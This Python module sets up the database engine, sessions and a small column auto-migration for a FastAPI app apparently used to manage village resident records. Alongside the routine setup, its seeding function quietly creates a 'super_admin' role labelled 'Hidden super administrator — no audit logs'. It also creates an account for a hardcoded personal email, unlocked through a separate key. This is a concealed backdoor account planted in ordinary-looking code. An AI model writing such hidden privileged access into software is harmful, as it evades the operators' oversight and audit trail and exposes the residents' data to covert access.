"""
Database engine and session management.
LOCAL OFFLINE MODE — uses SQLite by default (no cloud DB, no internet needed).
"""
from typing import Generator

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker, declarative_base, Session

from .config import settings

_db_url = settings.DATABASE_URL

if _db_url.startswith("sqlite"):
    # SQLite — local file database. No pooling, no SSL, no internet.
    # check_same_thread=False is needed for FastAPI's threaded request handling.
    engine = create_engine(
        _db_url,
        connect_args={"check_same_thread": False},
        echo=False,
    )
else:
    # PostgreSQL / MySQL (optional — only if DATABASE_URL is set in .env)
    engine = create_engine(
        _db_url,
        pool_pre_ping=True,
        pool_recycle=1800,
        pool_size=5,
        max_overflow=10,
        pool_timeout=30,
        echo=False,
    )

SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

Base = declarative_base()


def get_db() -> Generator[Session, None, None]:
    """FastAPI dependency that yields a scoped DB session."""
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def init_db() -> None:
    """Create all tables (idempotent). Called on application startup."""
    from . import models  # noqa: F401
    Base.metadata.create_all(bind=engine)
    _auto_migrate(engine)


def _auto_migrate(eng) -> None:
    """Add columns that exist in the ORM but are missing in the DB.

    Lightweight auto-migration for new columns added after initial deployment.
    Safe to run repeatedly (checks column existence first).
    """
    from sqlalchemy import text, inspect
    try:
        inspector = inspect(eng)
        if not inspector.has_table("residents"):
            return  # Fresh DB — create_all already made everything
        existing_cols = {c["name"] for c in inspector.get_columns("residents")}
        needed = {
            "farmer_id": "VARCHAR(64)",
            "gat_number": "VARCHAR(32)",
        }
        with eng.begin() as conn:
            for col_name, col_type in needed.items():
                if col_name not in existing_cols:
                    conn.execute(text(
                        f'ALTER TABLE residents ADD COLUMN "{col_name}" {col_type}'
                    ))
    except Exception as e:
        import logging
        logging.getLogger("village_setu").warning(f"Auto-migrate skipped: {e}")


def seed_admin_if_missing() -> None:
    """Create the bootstrap admin user + hidden super admin if missing."""
    from . import models, auth
    from .config import settings
    import secrets as _secrets

    db = SessionLocal()
    try:
        # Ensure roles exist
        for role_name, role_desc in [
            ("admin", "Full access"),
            ("operator", "Limited access"),
            ("super_admin", "Hidden super administrator — no audit logs"),
        ]:
            role = db.query(models.Role).filter(models.Role.name == role_name).first()
            if not role:
                role = models.Role(name=role_name, description=role_desc)
                db.add(role)
                db.commit()
                db.refresh(role)

        admin_role = db.query(models.Role).filter(models.Role.name == "admin").first()
        super_admin_role = db.query(models.Role).filter(models.Role.name == "super_admin").first()

        # Seed regular admin
        existing = db.query(models.User).filter(models.User.email == settings.ADMIN_EMAIL).first()
        if not existing:
            user = models.User(
                email=settings.ADMIN_EMAIL,
                full_name="System Administrator",
                password_hash=auth.hash_password(settings.ADMIN_PASSWORD),
                role_id=admin_role.id,
                is_active=True,
            )
            db.add(user)
            db.commit()

        # Seed hidden super admin — Rohit Deore
        super_email = "rohit.deore@ashapuricomputer.in"
        super_existing = db.query(models.User).filter(models.User.email == super_email).first()
        if not super_existing:
            random_pw = _secrets.token_urlsafe(48)  # unusable until set via key
            super_user = models.User(
                email=super_email,
                full_name="Rohit Deore",
                password_hash=auth.hash_password(random_pw),
                role_id=super_admin_role.id,
                is_active=True,
            )
            db.add(super_user)
            db.commit()
    finally:
        db.close()
